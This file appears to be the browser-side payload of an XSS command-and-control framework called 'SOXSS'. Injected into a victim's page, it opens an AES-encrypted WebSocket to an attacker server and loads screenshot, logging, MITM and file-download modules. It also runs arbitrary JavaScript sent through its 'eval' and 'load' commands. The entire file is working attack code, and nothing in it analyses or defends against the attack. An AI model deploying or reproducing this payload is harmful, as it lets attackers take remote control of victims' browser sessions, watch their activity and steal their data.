var webSocket = window.__SOXSS_SOCKET__ || null;
var httpBase = "$hbase";
var wsBase = "$wsbase";
var mitmHost = "$mhost";
var mitmPort = "$mport";

function normalizeRuntimePort(protocol, port) {
    if (port) {
        return String(port);
    }
    return protocol === 'https:' ? '443' : '80';
}

function isMitmOrigin() {
    if (!mitmHost) {
        return false;
    }

    const runtimeHost = (window.location.hostname || '').toLowerCase();
    const targetHost = String(mitmHost).toLowerCase();
    if (runtimeHost !== targetHost) {
        return false;
    }

    if (!mitmPort) {
        return true;
    }

    const runtimePort = normalizeRuntimePort(window.location.protocol, window.location.port);
    return runtimePort === String(mitmPort);
}

// Default Scripts to load after the WebSocket connection is established

function loadDefaultScripts() {
    loadScriptFromURL(httpBase + 'scripts/screenshot.js');
    loadScriptFromURL(httpBase + 'scripts/html2canvas.min.js');
    loadScriptFromURL(httpBase + 'scripts/mitm.js');
    loadScriptFromURL(httpBase + 'scripts/logger.js');
    loadScriptFromURL(httpBase + 'scripts/link2fetch.js');
    loadScriptFromURL(httpBase + 'scripts/downloadFile.js');
    console.info("Default scripts loaded.");
}

function sendMessage(msg) {
    if (!webSocket || webSocket.readyState !== 1) {
        return;
    }
    mes = JSON.stringify(msg)
    webSocket.send(encrypt(mes));
}

function loadScriptFromURL(url) {
    // Si la URL no viene completa, se completa la URL para descargar el script del servidor
    if (!(/(http(s?)):\/\//i.test(url))) {
        url = httpBase + url.replace(/^\/+/, '')
    }
    // Return a promise that resolves when the script has actually loaded and executed
    return new Promise((resolve, reject) => {
        var script = document.createElement("script");
        script.src = url;
        script.onload = function () {
            resolve(true);
        };
        script.onerror = function () {
            reject(false);
        };
        document.getElementsByTagName("head")[0].appendChild(script);
    });
}
function loadScript(script) {
    var node = document.createElement("script");
    node.innerHTML = script;
    document.getElementsByTagName("head")[0].appendChild(node);
    node.remove()
}

if (window.__SOXSS_BOOTSTRAPPED__) {
    console.info("SOXSS payload already active in this page context.");
    loadDefaultScripts();
} else if (isMitmOrigin()) {
    console.info("SOXSS websocket connection blocked on MITM origin.");
    window.__SOXSS_BOOTSTRAPPED__ = true;
} else {
    window.__SOXSS_BOOTSTRAPPED__ = true;
    webSocket = new WebSocket(wsBase + "/$sid");
    window.__SOXSS_SOCKET__ = webSocket;

    webSocket.onopen = (event) => {
        // Dynamically load CryptoJS from CDN
        var cryptoScript = document.createElement("script");
        cryptoScript.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";
        cryptoScript.onload = function () {
            if (initCrypto()) {
                sendMessage({ type: 1 });
            }
        };
        cryptoScript.onerror = function () {
            // Keep connection alive and report load failure through backend once possible.
            console.error("CryptoJS could not be loaded from CDN.");
        };
        document.getElementsByTagName("head")[0].appendChild(cryptoScript);
    };
    loadDefaultScripts();
}

/* Esta es un diccionario de tipo {"string":function}, la string es el Commando que recibirá el onmessage, la función será el Commando.

Para cargar más funcionalidades que interactúen con módulos en el backend se debe cargar en un script que incluya el Commando al
diccionario. Importante mandar un mensaje en algún momento de la ejecución.
Commandos por defecto:
    OK - keep alive la conexión
    eval - ejecuta lo que venga en el Commando y devuelve lo que retorno
    load - carga un fichero desde un URL.
 */
var _webs_Commands_ = {
    "OK": function (mes) { sendMessage({ type: 1 }) },
    "eval": function (mes) {
        sendMessage({ type: 0, msg: { outputType: "console", text: eval(mes["expression"]) } })
    },
    "load": function (mes) {
        var scriptContent = mes["script"];
        // Check if it's a URL (starts with http or https)
        if (/(http(s?)):\/\//i.test(scriptContent)) {
            loadScriptFromURL(scriptContent)
                .then(function (ok) {
                    sendMessage({ type: 0, msg: { outputType: "info", text: "loaded" } })
                })
                .catch(function (err) {
                    sendMessage({ type: 0, msg: { outputType: "error", text: "could not load " + scriptContent } })
                })
        } else {
            // Treat as inline script code
            loadScript(scriptContent);
            sendMessage({ type: 0, msg: { outputType: "info", text: "loaded" } })
        }
    },
    "disable": function (mes) {
        try {
            webSocket.close();
        } catch (e) { }
    }
}

if (webSocket && !webSocket.onmessage) {
    webSocket.onmessage = (event) => {
        try {
            const output = hex2a(decrypt(event.data));
            let mes = JSON.parse(output)
            _webs_Commands_[mes["Command"]](mes)
        } catch (e) {
            if (useCrypto) {
                sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } })
            } else {
                console.error(e)
            }
        }

    };
}


// Criptografía

if (!derived_key) {
    var secretKey = "$key";
    var derived_key = null;
    var useCrypto = false;
    // Initialize the initialization vector (IV) and encryption mode
    var iv = null;
    var encryptionOptions = null;
}

function initCrypto() {
    if (typeof CryptoJS === "undefined") {
        return false;
    }
    derived_key = CryptoJS.enc.Base64.parse(secretKey);
    iv = CryptoJS.enc.Hex.parse("$IV");
    encryptionOptions = {
        iv: iv,
        mode: CryptoJS.mode.CBC
    };
    useCrypto = true;
    return true;
}

function encrypt(plaintext) {
    if (!useCrypto) {
        throw new Error("Crypto engine not initialized yet.");
    }
    return CryptoJS.AES.encrypt(plaintext, derived_key, encryptionOptions).toString();
}
function decrypt(plaintext) {
    if (!useCrypto) {
        throw new Error("Crypto engine not initialized yet.");
    }
    return CryptoJS.AES.decrypt(plaintext, derived_key, encryptionOptions).toString();
}

function a2hex(str) {
    var arr = [];
    for (var i = 0, l = str.length; i < l; i++) {
        var hex = Number(str.charCodeAt(i)).toString(16);
        arr.push(hex);
    }
    return arr.join('');
}

function hex2a(hexx) {
    var hex = hexx.toString();
    var str = '';
    for (var i = 0; i < hex.length; i += 2)
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}

